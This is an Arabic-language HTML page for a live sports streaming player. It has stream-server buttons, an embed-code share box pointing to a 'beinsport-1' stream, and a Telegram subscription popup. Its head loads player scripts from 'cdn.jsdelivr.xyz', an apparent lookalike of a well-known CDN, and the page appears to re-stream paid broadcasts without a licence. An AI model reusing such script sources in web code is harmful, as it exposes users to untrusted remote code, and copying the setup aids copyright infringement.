<!DOCTYPE html>
<html dir="rtl" lang="ar" prefix="og: https://ogp.me/ns#">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1" />
    <link rel="canonical" href="https://dd.alkoora.live/albaplayer/on-time-sport-2/" />
    <title>اون تايم سبورت 2 on time sport</title>
    <link rel="stylesheet" href="https://cdn.plyr.io/3.7.8/plyr.css" />
    <style>
        :root {
            --plyr-video-control-background-hover: rgba(156, 136, 255, .9);
            --plyr-color-main: #9c88ff;
        }

        body {
            box-sizing: border-box;
            background: #000;
            font-family: sans-serif;
            margin: 0;
        }

        * {
            text-decoration: none;
        }

        .albaplayer_videos_channel {
            position: absolute;
            z-index: 999;
            left: 8px;
            top: 6px;
            right: 8px;
            height: 0;
        }

        .albaplayer_videos_channel .button {
            background: #9e1414;
            cursor: pointer;
            font-size: 14px;
            float: left;
            display: block;
            border-radius: 2px;
            height: 25px;
            text-align: center;
            line-height: 22px;
            text-shadow: 0 1px 1px #000;
            color: #fff;
            padding: 0 10px;
            font-weight: 700;
        }

        .albaplayer_videos_channel .refresh {
            float: right;
        }

        .albaplayer_site_name {
            display: none;
            text-shadow: 2px 2px 2px #000;
            z-index: 9;
            bottom: 18%;
            position: fixed;
            width: 100%;
            text-align: center;
            color: #fff;
            font-size: 3vw;
        }

        .albaplayer_server-body {
            position: relative;
            width: 100%;
            background: #000;
            height: calc(100vh - 60px);
            overflow: hidden;
        }

        .albaplayer_name {
            display: flex;
            justify-content: flex-end;
            direction: rtl;
            background: #000;
            padding: 0 2px;
            max-height: 50px;
            overflow: hidden;
            margin: 0;
            list-style: none;
        }

        .albaplayer_name li {
            margin: 4px 2px;
            flex: 1;
            display: flex;
            justify-content: center;
        }

        .albaplayer_name a {
            background: #552a86;
            font-size: 16px;
            padding: 5px 5px 7px;
            border-radius: 1px;
            height: 43px;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff !important;
            width: 100%;
        }

        .albaplayer_name a.active,
        .albaplayer_name a:hover {
            background: #9e1414;
            transition: .3s all cubic-bezier(.68, -.55, .265, 1.55);
        }

        .embed-responsive {
            height: 100%;
            position: relative;
            display: block;
            width: 100%;
            padding: 0;
        }

        .embed-responsive iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 0;
        }

        #albaplayer_share_channel {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, .9);
            height: 100vh;
            text-align: center;
            z-index: 10001;
        }

        .share-channel {
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%);
        }

        .share-channel textarea {
            width: 90%;
            max-width: 600px;
            background: rgba(255, 255, 255, 0.26);
            border: 0;
            color: #fff;
            height: 54px;
            padding: 5px;
            font-size: 14px;
            direction: ltr;
        }

        .custom-btn {
            margin-top: 6px;
            background: #552a86;
            color: #fff;
            padding: 5px 16px;
            border-radius: 5px;
            font-weight: 700;
            cursor: pointer;
            border: none;
        }

        /* Telegram Button */
        #tme {
            position: fixed;
            bottom: 50px;
            right: 25px;
            width: 48px;
            height: 48px;
            background-color: #0088cc;
            border-radius: 50%;
            z-index: 999999;
            cursor: pointer;
        }

        #tme_message {
            position: absolute;
            bottom: 62px;
            right: -10px;
            width: 250px;
            background: white;
            padding: 10px;
            border-radius: 4px;
            box-shadow: 0 2px 5px rgb(0 0 0);
        }

        #tme_message p {
            font-size: 12px;
            color: #8e8e8e;
        }

        #tme_message a {
            background: #0088cc;
            color: #fff;
            padding: 2px 7px;
            border-radius: 5px;
            text-decoration: none;
        }

        .clossalert {
            position: absolute;
            top: -10px;
            left: -10px;
            background: #fff;
            font-size: 10px;
            border: 1px solid #d9d9d9;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .showother {
            display: none;
            position: absolute;
            z-index: 10000;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
        }
    </style>

    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest/dist/hls.min.js"></script>
    <script src="https://cdn.jsdelivr.xyz/gh/clappr/clappr@latest/dist/clappr.min.js"></script>
    <script src="https://cdn.jsdelivr.xyz/gh/clappr/clappr-level-selector-plugin@latest/dist/level-selector.min.js"></script>
    <script src="https://cdn.plyr.io/3.7.8/plyr.js"></script>
</head>

<body>
    <ul class="albaplayer_name">
        <li><a href="?serv=1">بث 1</a></li>
        <li><a href="?serv=2">بث 2</a></li>
        <li><a href="?serv=3">بث 3</a></li>
        <li><a href="?serv=4">بث 4</a></li>
        <li><a href="?serv=5">بث 5</a></li>
    </ul>

    <div class="albaplayer_server-body">
        <div id="video-player-container" class="embed-responsive"></div>

        <div class="albaplayer_videos_channel">
            <a class="button refresh" href="javascript:window.location.reload()">تحديث</a>
            <div id="showshare" style="display: block;">
                <div class="button share" onclick="document.getElementById('showother').style.display='block';document.getElementById('showshare').style.display='none'">مشاركة</div>
            </div>
            <div class="showother" id="showother">
<div class="showother" id="showother">
    <div id="albaplayer_share_channel">
        <div class="button close" style="position:absolute;top:10px;left:10px;z-index:10002;" onclick="document.getElementById('showother').style.display='none';document.getElementById('showshare').style.display='block'">اغلاق</div>
        <div class="share-channel">
            <div class="albaplayer_share_title">كود التضمين</div>
            <textarea onclick="this.select()" id="albaplayer_player_share" readonly><iframe allowfullscreen="true" frameborder="0" height="500px" scrolling="1" src="https://alzaeem-live.github.io/beinsport-1/?serv=1" width="100%"></iframe></textarea>
            <button class="custom-btn" onclick="document.querySelector('#albaplayer_player_share').select();document.execCommand('copy');">انقر للنسخ</button>
        </div>
    </div>
</div>

        </div>
    </div>

    <div id="tme">
        <div id="tme_message">
            <button class="clossalert" onclick="document.getElementById('tme').style.display='none';">X</button>
            <strong>اشترك في موقعنا مجانا</strong>
            <p>خدمة الكورة لايف المجانية لمشاهدة مباريات اليوم بث مباشر بدون تقطيع على التليجرام
                <a href="https://t.me/your_telegram_channel" target="_blank" rel="nofollow">اضغط للاشتراك</a>
            </p>
        </div>
        <svg fill="#fff" width="25" height="25" viewBox="0 0 33 33" xmlns="http://www.w3.org/2000/svg">
            <path d="M16.5,0C7.4,0,0,7.4,0,16.5S7.4,33,16.5,33S33,25.6,33,16.5S25.6,0,16.5,0z M24.6,11.6l-2.9,13.7
                c-0.2,1-0.8,1.3-1.6,0.8l-4.5-3.3l-2.2,2.1c-0.2,0.2-0.5,0.4-0.8,0.4l0.3-4.8l8.7-7.9c0.4-0.4-0.1-0.6-0.6-0.2l-10.8,6.8
                L6.7,16.9c-1-0.3-1-1-0.1-1.4l16.8-6.5C24.3,8.5,25,9.3,24.6,11.6z"/>
        </svg>
    </div>
</body>
</html>
